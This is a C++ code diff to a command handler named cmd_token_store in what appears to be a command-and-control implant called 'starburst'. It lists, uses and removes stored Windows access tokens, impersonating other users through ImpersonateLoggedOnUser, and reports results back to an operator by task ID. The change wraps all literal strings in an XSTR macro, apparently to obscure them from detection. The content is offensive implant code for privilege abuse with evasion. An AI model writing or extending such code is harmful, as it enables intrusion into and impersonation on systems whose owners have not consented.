@@ -28,7 +28,7 @@ auto declfn starburst::cmd_token_store(
     auto action_str = parser_string( params, &action_len );
     if ( !action_str || action_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no action provided (list/use/remove)" ) ) );
+            XSTR( "no action provided (list/use/remove)" ) );
         return;
     }
 
@@ -40,17 +40,16 @@ auto declfn starburst::cmd_token_store(
     auto store = reinterpret_cast<TokenEntry*>( inst.token_store );
 
     // --- LIST ---
-    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "list" ) ) ) == 0 ) {
+    if ( str_cmp( action, XSTR( "list" ) ) == 0 ) {
         uint32_t out_cap = 4096;
         auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
         if ( !output ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
 
-        str_copy( output, symbol<char*>( const_cast<char*>(
-            "ID\tUser\tPID\tActive\n" ) ) );
+        str_copy( output, XSTR("ID\tUser\tPID\tActive\n") );
         uint32_t off = str_len( output );
 
         bool found = false;
@@ -84,15 +83,15 @@ auto declfn starburst::cmd_token_store(
             output[off++] = '\t';
 
             // Active
-            str_copy( output + off, symbol<char*>( const_cast<char*>( "Yes" ) ) );
+            str_copy( output + off, XSTR( "Yes" ) );
             off += 3;
 
             output[off++] = '\n';
         }
 
         if ( !found ) {
-            str_copy( output + off, symbol<char*>( const_cast<char*>( "(no tokens stored)" ) ) );
-            off += str_len( symbol<char*>( const_cast<char*>( "(no tokens stored)" ) ) );
+            str_copy( output + off, XSTR( "(no tokens stored)" ) );
+            off += str_len( XSTR( "(no tokens stored)" ) );
         }
 
         output[off] = '\0';
@@ -102,23 +101,23 @@ auto declfn starburst::cmd_token_store(
     }
 
     // --- USE ---
-    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "use" ) ) ) == 0 ) {
+    if ( str_cmp( action, XSTR( "use" ) ) == 0 ) {
         uint32_t token_id = parser_int32( params );
         if ( token_id >= MAX_TOKEN_ENTRIES ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "invalid token ID" ) ) );
+                XSTR( "invalid token ID" ) );
             return;
         }
 
         if ( !store[token_id].active || !store[token_id].token ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "token slot not active" ) ) );
+                XSTR( "token slot not active" ) );
             return;
         }
 
         if ( !inst.advapi32.ImpersonateLoggedOnUser( store[token_id].token ) ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
+                XSTR( "ImpersonateLoggedOnUser failed" ) );
             return;
         }
 
@@ -129,30 +128,30 @@ auto declfn starburst::cmd_token_store(
         inst.agent.impersonated_token = store[token_id].token;
 
         char msg[192] = { 0 };
-        str_copy( msg, symbol<char*>( const_cast<char*>( "Using token #" ) ) );
+        str_copy( msg, XSTR( "Using token #" ) );
         char num[12];
         int_to_str( num, token_id, 10 );
         str_concat( msg, num );
-        str_concat( msg, symbol<char*>( const_cast<char*>( " (" ) ) );
+        str_concat( msg, XSTR( " (" ) );
         str_concat( msg, store[token_id].username );
-        str_concat( msg, symbol<char*>( const_cast<char*>( ")" ) ) );
+        str_concat( msg, XSTR( ")" ) );
 
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
         return;
     }
 
     // --- REMOVE ---
-    if ( str_cmp( action, symbol<char*>( const_cast<char*>( "remove" ) ) ) == 0 ) {
+    if ( str_cmp( action, XSTR( "remove" ) ) == 0 ) {
         uint32_t token_id = parser_int32( params );
         if ( token_id >= MAX_TOKEN_ENTRIES ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "invalid token ID" ) ) );
+                XSTR( "invalid token ID" ) );
             return;
         }
 
         if ( !store[token_id].active ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "token slot not active" ) ) );
+                XSTR( "token slot not active" ) );
             return;
         }
 
@@ -169,7 +168,7 @@ auto declfn starburst::cmd_token_store(
         memory::zero( store[token_id].username, 128 );
 
         char msg[64] = { 0 };
-        str_copy( msg, symbol<char*>( const_cast<char*>( "Removed token #" ) ) );
+        str_copy( msg, XSTR( "Removed token #" ) );
         char num[12];
         int_to_str( num, token_id, 10 );
         str_concat( msg, num );
@@ -179,7 +178,7 @@ auto declfn starburst::cmd_token_store(
     }
 
     queue_response( inst, task_uuid, RESPONSE_ERROR,
-        symbol<char*>( const_cast<char*>( "unknown action (list/use/remove)" ) ) );
+        XSTR( "unknown action (list/use/remove)" ) );
 }
 
 #endif
